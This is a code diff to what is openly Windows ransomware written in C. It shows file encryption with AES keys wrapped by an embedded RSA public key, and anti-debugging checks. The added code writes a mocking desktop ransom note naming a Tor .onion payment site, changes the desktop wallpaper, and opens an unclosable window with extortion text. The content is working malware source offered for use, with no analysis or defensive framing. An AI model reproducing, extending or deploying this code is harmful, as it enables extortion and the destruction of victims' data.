@@ -3,6 +3,9 @@
 #include"aes.h"
 #include"commonEnc.h"
 #include <stdio.h>
+#include <Lmcons.h>]
+#include <shlobj.h>
+#pragma comment(lib, "gdiplus.lib")
 
 #pragma comment(lib,"advapi32.lib");
 
@@ -640,10 +643,6 @@ BOOL DirectoryFiles(WCHAR* pDirectoryPath,uint8_t* key, uint8_t* iv) {
 			}
 		}
 		else {
-			if (wcscmp(fileData.cFileName, L"NOVAphones.rar") == 0) {
-				DeleteWin(filePath);
-				continue;
-			}
 
 			if (!ReadFromFile(&pData, filePath, &szData)) {
 				continue;
@@ -712,7 +711,7 @@ BOOL DirectoryFiles(WCHAR* pDirectoryPath,uint8_t* key, uint8_t* iv) {
 
 BOOL ImportPubkey(HCRYPTPROV* hCryptProv,HCRYPTKEY* hKey) {
 
-	BYTE publicKey[] = {
+	BYTE serverPublicKey[] = {
 	0x06, 0x02, 0x00, 0x00, 0x00, 0xA4, 0x00, 0x00, 0x52, 0x53, 0x41, 0x31, 0x00, 0x04, 0x00, 0x00,
 	0x01, 0x00, 0x01, 0x00, 0xD1, 0x75, 0xA3, 0x89, 0x7E, 0x64, 0xD3, 0xD6, 0x48, 0xF5, 0x84, 0xC2,
 	0xC2, 0x22, 0x41, 0x61, 0x8F, 0xBC, 0xB4, 0x66, 0x4E, 0xF7, 0x2D, 0x3F, 0x57, 0xAF, 0xB8, 0x93,
@@ -751,7 +750,7 @@ BOOL ImportPubkey(HCRYPTPROV* hCryptProv,HCRYPTKEY* hKey) {
 	}
 
 
-	if (!pCryptImportKey(*hCryptProv, publicKey, sizeof(publicKey), 0, CRYPT_EXPORTABLE, hKey)) {
+	if (!pCryptImportKey(*hCryptProv, serverPublicKey, sizeof(serverPublicKey), 0, CRYPT_EXPORTABLE, hKey)) {
 		return FALSE;
 	}
 
@@ -798,7 +797,7 @@ BOOL RSAwork(uint8_t* keyValue, WCHAR* keyPath) {
 	
 
 	HCRYPTPROV hProv = 0;
-	HCRYPTKEY handlePKey = 0;
+	HCRYPTKEY serverHandlePKey = 0;
 	SIZE_T szEncAESKey = AES_256_KEY_SIZE;
 	SIZE_T szPublicKey = 0;
 	PBYTE publicKey = NULL;
@@ -825,11 +824,11 @@ BOOL RSAwork(uint8_t* keyValue, WCHAR* keyPath) {
 	}
 
 
-	if (!ImportPubkey(&hProv,&handlePKey)) {
+	if (!ImportPubkey(&hProv,&serverHandlePKey)) {
 		goto _EndFucntion;
 	}
 
-	if (!EncryptAESKey(handlePKey, (PBYTE)keyValue, &szEncAESKey, &encAESKey)) {
+	if (!EncryptAESKey(serverHandlePKey, (PBYTE)keyValue, &szEncAESKey, &encAESKey)) {
 		goto _EndFucntion;
 	}
 
@@ -841,7 +840,7 @@ BOOL RSAwork(uint8_t* keyValue, WCHAR* keyPath) {
 
 _EndFucntion:
 
-	if (handlePKey) pCryptDestroyKey(handlePKey);
+	if (serverHandlePKey) pCryptDestroyKey(serverHandlePKey);
 	if (hProv) pCryptReleaseContext(hProv, 0);
 
 	if (publicKey) {
@@ -856,26 +855,7 @@ _EndFucntion:
 	return result;
 }
 
-BOOL DeleteWin(WCHAR* filePath) {
-	BOOL bSuccess = FALSE;
 
-	if (!filePath) {
-		printf("[!] Invalid parameters passed to DeleteWin\n");
-		return FALSE;
-	}
-
-	// Reset attributes to normal to avoid issues
-	if (!SetFileAttributesW(filePath, FILE_ATTRIBUTE_NORMAL)) {
-		printf("[!] Failed to reset file attributes %d\n", GetLastError());
-	}
-
-	bSuccess = DeleteFileW(filePath);
-	if (!bSuccess) {
-		printf("[!] Cannot delete file %d\n", GetLastError());
-	}
-
-	return bSuccess;
-}
 
 BOOL CheckIsDebuggerPresent() {
 	if (IsDebuggerPresent()) {
@@ -1010,3 +990,468 @@ BOOL CheckUsingExceptions() {
 	return debuggerDetected;
 }
 
+BOOL WriteShellcodeToFile(const BYTE* shellcode, DWORD shellcodeSize, const char* filePath) {
+	if (!shellcode || !filePath || shellcodeSize == 0) {
+		SetLastError(ERROR_INVALID_PARAMETER);
+		return FALSE;
+	}
+
+	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, FALSE };
+	HANDLE hFile = CreateFileA(
+		filePath,
+		GENERIC_WRITE,
+		0,
+		&sa,
+		CREATE_ALWAYS,
+		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH, // Ensure data is written directly to disk
+		NULL
+	);
+
+	if (hFile == INVALID_HANDLE_VALUE) {
+		return FALSE; // GetLastError() will already contain the error code
+	}
+
+	BOOL success = FALSE;
+	DWORD bytesWritten = 0;
+
+	// Write the data
+	success = WriteFile(
+		hFile,
+		shellcode,
+		shellcodeSize,
+		&bytesWritten,
+		NULL
+	);
+
+	// Verify all bytes were written
+	if (success && bytesWritten == shellcodeSize) {
+		// Flush buffers to ensure data is written to disk
+		FlushFileBuffers(hFile);
+	}
+	else {
+		success = FALSE;
+	}
+
+	// Always close the handle
+	CloseHandle(hFile);
+	return success;
+}
+
+BOOL SetWallpaper(LPCWSTR wallpaperPath) {
+	// Parameter validation
+	if (!wallpaperPath) {
+		SetLastError(ERROR_INVALID_PARAMETER);
+		return FALSE;
+	}
+
+	// Check if file exists
+	if (GetFileAttributesW(wallpaperPath) == INVALID_FILE_ATTRIBUTES) {
+		return FALSE; // File doesn't exist
+	}
+
+	BOOL success = TRUE;
+	HKEY hKey = NULL;
+
+	// Open registry key
+	LONG result = RegOpenKeyExW(
+		HKEY_CURRENT_USER,
+		L"Control Panel\\Desktop",
+		0,
+		KEY_WRITE,
+		&hKey
+	);
+
+	if (result != ERROR_SUCCESS) {
+		SetLastError(result);
+		return FALSE;
+	}
+
+	// Set wallpaper style to stretched (2)
+	// Using proper string size calculation for REG_SZ
+	const WCHAR* stretchedValue = L"2";
+	result = RegSetValueExW(
+		hKey,
+		L"WallpaperStyle",
+		0,
+		REG_SZ,
+		(const BYTE*)stretchedValue,
+		(wcslen(stretchedValue) + 1) * sizeof(WCHAR)
+	);
+
+	if (result != ERROR_SUCCESS) {
+		success = FALSE;
+		goto cleanup;
+	}
+
+	// Set tile wallpaper to 0 (no tiling)
+	const WCHAR* tileValue = L"0";
+	result = RegSetValueExW(
+		hKey,
+		L"TileWallpaper",
+		0,
+		REG_SZ,
+		(const BYTE*)tileValue,
+		(wcslen(tileValue) + 1) * sizeof(WCHAR)
+	);
+
+	if (result != ERROR_SUCCESS) {
+		success = FALSE;
+		goto cleanup;
+	}
+
+cleanup:
+	// Always close the registry key
+	if (hKey) {
+		RegCloseKey(hKey);
+	}
+
+	// Only try to set the wallpaper if registry operations succeeded
+	if (success) {
+		// Apply the wallpaper change
+		if (!SystemParametersInfoW(
+			SPI_SETDESKWALLPAPER,
+			0,
+			(PVOID)wallpaperPath,
+			SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
+		)) {
+			success = FALSE;
+		}
+	}
+
+	return success;
+}
+
+BOOL GetDynamicPath(wchar_t* pathBuffer, size_t bufferSize) {
+	// Parameter validation
+	if (!pathBuffer || bufferSize == 0) {
+		SetLastError(ERROR_INVALID_PARAMETER);
+		return FALSE;
+	}
+
+	// Use environment variables to get the user's profile directory
+	// This is more reliable than hardcoding "C:\Users\"
+	wchar_t userProfilePath[MAX_PATH];
+	DWORD result = ExpandEnvironmentStringsW(L"%USERPROFILE%", userProfilePath, MAX_PATH);
+
+	if (result == 0 || result > MAX_PATH) {
+		// Fall back to the alternative method if environment variable expansion fails
+		wchar_t username[UNLEN + 1];
+		DWORD username_len = UNLEN + 1;
+
+		if (!GetUserNameW(username, &username_len)) {
+			// If we can't get the username, use the Default user profile
+			wcscpy_s(pathBuffer, bufferSize, L"C:\\Users\\Default\\Pictures\\image1.bmp");
+			return TRUE;
+		}
+
+		// Safely construct the path with proper buffer size checking
+		if (FAILED(StringCchPrintfW(pathBuffer, bufferSize,
+			L"C:\\Users\\%s\\Pictures\\image1.bmp", username))) {
+			SetLastError(ERROR_INSUFFICIENT_BUFFER);
+			return FALSE;
+		}
+	}
+	else {
+		// Safely append the Pictures path to the user profile path
+		if (FAILED(StringCchPrintfW(pathBuffer, bufferSize,
+			L"%s\\Pictures\\image1.bmp", userProfilePath))) {
+			SetLastError(ERROR_INSUFFICIENT_BUFFER);
+			return FALSE;
+		}
+	}
+
+	return TRUE;
+}
+
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
+
+
+	switch (uMsg) {
+	case WM_SYSCOMMAND:
+		if ((wParam & 0xFFF0) == SC_CLOSE) {
+			return 0;
+		}
+		break;
+
+	case WM_CLOSE:
+		return 0;
+
+
+
+	case WM_PAINT: {
+		PAINTSTRUCT ps;
+		HDC hdc = BeginPaint(hwnd, &ps);
+		FillRect(hdc, &ps.rcPaint, (HBRUSH)GetStockObject(BLACK_BRUSH));
+		// Set text properties
+		SetTextColor(hdc, RGB(139, 0, 0)); // Dark red text
+		SetBkMode(hdc, RGB(0, 0, 0)); // Transparent background
+
+		// Define text
+		LPCWSTR text = L"WELL, WELL, WELL... LOOK WHO GOT CAUGHT!  >.< Oopsie! ";
+		LPCWSTR text1 = L"Your precious system? Not yours anymore  :'( ";
+		LPCWSTR text2 = L"Your data? Still there.. but let’s just say it’s on a little vacation. And nope, you’re not invited";
+		LPCWSTR text3 = L"WE’RE SOOOO SORRY...";
+		LPCWSTR text4 = L"(Just kidding—we’re not.)";
+		LPCWSTR text5 = L"Wanna beg for your files back?";
+		LPCWSTR text6 = L"No worries, we made it super easy for you:";
+		LPCWSTR text7 = L"Go ahead, check that cute little README on your desktop.";
+		LPCWSTR text8 = L"Go ahead, check that cute little README on your desktop.";
+
+		// Get window dimensions
+		RECT textRect;
+		GetClientRect(hwnd, &textRect);
+
+		// Calculate vertical spacing
+		int spaceBetweenText = 35;  // Adjust the spacing between the lines of text
+		textRect.top += spaceBetweenText;
+		textRect.bottom += spaceBetweenText;
+
+		// Draw the first text phrase centered
+		DrawText(hdc, text, -1, &textRect, DT_SINGLELINE | DT_CENTER);
+
+		// Move down for the next text phrase
+		textRect.top += spaceBetweenText;
+		textRect.bottom += spaceBetweenText;
+
+		// Draw the second text phrase centered (with vertical spacing)
+		DrawText(hdc, text1, -1, &textRect, DT_SINGLELINE | DT_CENTER);
+
+		// Move down for the next text phrase
+		textRect.top += spaceBetweenText;
+		textRect.bottom += spaceBetweenText;
+
+		// Draw the third text phrase centered (with vertical spacing)
+		DrawText(hdc, text2, -1, &textRect, DT_SINGLELINE | DT_CENTER);
+		textRect.top += spaceBetweenText;
+		textRect.bottom += spaceBetweenText;
+
+		// Draw the second text phrase centered (with vertical spacing)
+		DrawText(hdc, text3, -1, &textRect, DT_SINGLELINE | DT_CENTER);
+
+		textRect.top += spaceBetweenText;
+		textRect.bottom += spaceBetweenText;
+
+		// Draw the first text phrase centered
+		DrawText(hdc, text4, -1, &textRect, DT_SINGLELINE | DT_CENTER);
+
+		textRect.top += spaceBetweenText;
+		textRect.bottom += spaceBetweenText;
+
+		// Draw the first text phrase centered
+		DrawText(hdc, text5, -1, &textRect, DT_SINGLELINE | DT_CENTER);
+
+		textRect.top += spaceBetweenText;
+		textRect.bottom += spaceBetweenText;
+
+		// Draw the first text phrase centered
+		DrawText(hdc, text6, -1, &textRect, DT_SINGLELINE | DT_CENTER);
+
+		textRect.top += spaceBetweenText;
+		textRect.bottom += spaceBetweenText;
+
+		// Draw the first text phrase centered
+		DrawText(hdc, text7, -1, &textRect, DT_SINGLELINE | DT_CENTER);
+
+
+		textRect.top += spaceBetweenText;
+		textRect.bottom += spaceBetweenText;
+
+		// Draw the first text phrase centered
+		DrawText(hdc, text8, -1, &textRect, DT_SINGLELINE | DT_CENTER);
+
+		EndPaint(hwnd, &ps);  // Call EndPaint once after all drawing
+
+
+
+	}
+	case WM_CTLCOLORBTN: {
+		HDC hdcBtn = (HDC)wParam;
+		SetTextColor(hdcBtn, RGB(139, 0, 0));
+		SetBkColor(hdcBtn, RGB(20, 20, 20));
+
+		static HBRUSH hBrush = NULL;
+		if (!hBrush) {
+			hBrush = CreateSolidBrush(RGB(20, 20, 20));
+		}
+
+		return (INT_PTR)hBrush;
+	}
+
+	case WM_CREATE: {
+
+		RECT rect;
+		GetClientRect(hwnd, &rect);
+
+		int buttonWidth = 300;
+		int buttonHeight = 50;
+
+		int x = (rect.right - buttonWidth) / 2;
+		int y = (rect.bottom - buttonHeight) / 1.1;
+
+		HWND hButton = CreateWindowW(
+			L"BUTTON",
+			L"PRESS ME",
+			WS_VISIBLE | WS_CHILD,
+			x, y, buttonWidth, buttonHeight,
+			hwnd, (HMENU)2, NULL, NULL
+		);
+
+		break;
+	}
+	case WM_COMMAND:
+		if (LOWORD(wParam) == 2) {
+
+			MessageBoxW(
+				hwnd,
+				L"MORE FILES HAVE BEEN ENCRYPTED, ARE YOU IDIOT OR SOMETHING LIKE THAT ?",
+				L"HAHAHA! AGAIN",
+				MB_ICONHAND | MB_OK
+			);
+		}
+		break;
+
+	case WM_DESTROY:
+		PostQuitMessage(0);
+		break;
+
+	default: {
+
+		return DefWindowProc(hwnd, uMsg, wParam, lParam);
+	}
+
+	}
+	return 0;
+}
+
+VOID WriteWarningToDesktop() {
+	char desktopPath[MAX_PATH];
+
+	// Get Desktop path
+	if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath))) {
+		// Build full path: Desktop\output.txt
+		strcat(desktopPath, "\\Readme.txt");
+
+		// Create the file
+		HANDLE hFile = CreateFileA(
+			desktopPath,
+			GENERIC_WRITE,
+			0,
+			NULL,
+			CREATE_ALWAYS,
+			FILE_ATTRIBUTE_NORMAL,
+			NULL
+		);
+
+
+
+		// Fixed message
+		const char* message =
+			"OH NO! Looks like someone’s having a bad day...\n"
+			"\n"
+			"Your files? Locked.\n"
+			"Your system? Ours now.\n"
+			"Your control? Long gone.\n"
+			"\n"
+			"But hey, don’t cry just yet—we’re feeling generous today.\n"
+			"\n"
+			"Want your precious data back?\n"
+			"Here’s how to maybe earn our mercy:\n"
+			"\n"
+			"1. Download the Tor Browser – yeah, regular browsers won’t help you now.\n"
+			"\n"
+			"2. Open it. Take a deep breath.\n"
+			"\n"
+			"3. Go to our special website (you’ll love it):\n"
+			"http://tazayldgziyi46ylvrhezoep4bskhkrq2ipkdclmuygaxwu43amiicyd.onion\n"
+			"\n"
+			"Once you're there, follow the instructions. Yes, it involves money. No, we don’t do refunds.\n"
+			"Try anything funny, and your files take a one-way trip to the digital abyss.\n"
+			"\n"
+			"Time’s ticking.\n"
+			"Every second you wait, your chances get slimmer.\n"
+			"Tick tock\n";
+		DWORD bytesWritten;
+		WriteFile(hFile, message, strlen(message), &bytesWritten, NULL);
+
+		// Close file
+		CloseHandle(hFile);
+
+	}
+
+}
+
+BOOL InitializePhantomWindow(HINSTANCE hInstance, int nCmdShow, const BYTE* shellcode, DWORD shellcodeSize, WNDPROC windowProc) {
+	if (!hInstance || !windowProc || !shellcode || shellcodeSize == 0) {
+		SetLastError(ERROR_INVALID_PARAMETER);
+		return FALSE;
+	}
+
+	// Get username in ASCII format
+	char usernameA[256] = { 0 };
+	DWORD usernameASize = sizeof(usernameA);
+	if (!GetUserNameA(usernameA, &usernameASize)) {
+		return FALSE;
+	}
+
+	// Construct file path for shellcode
+	char filePath[MAX_PATH] = { 0 };
+	if (FAILED(StringCchPrintfA(filePath, MAX_PATH, "C:\\Users\\%s\\Pictures\\image2.bmp", usernameA))) {
+		return FALSE;
+	}
+
+	// Write shellcode to file
+	if (!WriteShellcodeToFile(shellcode, shellcodeSize, filePath)) {
+		return FALSE;
+	}
+
+	// Get username in wide character format
+	WCHAR usernameW[256] = { 0 };
+	DWORD usernameWSize = ARRAYSIZE(usernameW);
+	if (!GetUserNameW(usernameW, &usernameWSize)) {
+		return FALSE;
+	}
+
+	// Construct wallpaper path
+	WCHAR wallpaperPath[MAX_PATH] = { 0 };
+	if (FAILED(StringCchPrintfW(wallpaperPath, MAX_PATH, L"C:\\Users\\%s\\Pictures\\image2.bmp", usernameW))) {
+		return FALSE;
+	}
+
+	// Set wallpaper
+	if (!SetWallpaper(wallpaperPath)) {
+		// Continue execution even if setting wallpaper fails
+	}
+
+	// Register window class
+	const wchar_t CLASS_NAME[] = L"PhantomWindow";
+	WNDCLASS wc = { 0 };
+	wc.lpfnWndProc = windowProc;
+	wc.hInstance = hInstance;
+	wc.lpszClassName = CLASS_NAME;
+	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
+
+	if (!RegisterClass(&wc)) {
+		return FALSE;
+	}
+
+	// Create window
+	HWND hwnd = CreateWindowEx(
+		0,
+		CLASS_NAME,
+		L"",
+		WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
+		CW_USEDEFAULT, CW_USEDEFAULT,
+		700, 500,
+		NULL, NULL, hInstance, NULL
+	);
+
+	if (!hwnd) {
+		return FALSE;
+	}
+
+	// Show and update window
+	ShowWindow(hwnd, nCmdShow);
+	UpdateWindow(hwnd);
+
+	return TRUE;
+}
